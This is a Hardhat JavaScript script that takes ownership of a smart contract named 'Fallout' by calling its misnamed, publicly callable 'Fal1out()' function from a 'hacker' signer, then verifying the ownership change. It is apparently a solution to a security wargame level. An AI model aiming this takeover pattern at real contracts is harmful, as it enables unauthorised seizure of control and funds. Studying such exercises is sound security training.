// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {
  // 👉 Contract name and address
  const contractName = "Fallout";
  const contractAddress = "0x4c7f1fE15ae57A6560eBF80E99741c1eF9D54273";

  // We get the contract to be hacked
  const contract = await hre.ethers.getContractAt(
    contractName,
    contractAddress
  );

  // Get current contract owner
  const owner = await contract.owner();
  console.log(`🙍‍♂️ Owner:\n ${owner} \n`);

  // Get accounts
  const [hackerSigner] = await hre.ethers.getSigners();
  console.log(`🤓 Hacker address:\n ${hackerSigner.address} \n`);

  // Hacking the contract
  const changeOwnerTx = await contract.connect(hackerSigner).Fal1out();
  await changeOwnerTx.wait((confirms = 1));

  // Get current contract owner
  const newOwner = await contract.owner();
  console.log(`🙍‍♂️ New owner:\n ${newOwner} \n`);
  if (newOwner === hackerSigner.address) {
    console.log(`✅ Contract owner changed to:\n ${newOwner} \n`);
  } else {
    console.log(`❌ Contract owner not changed`);
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
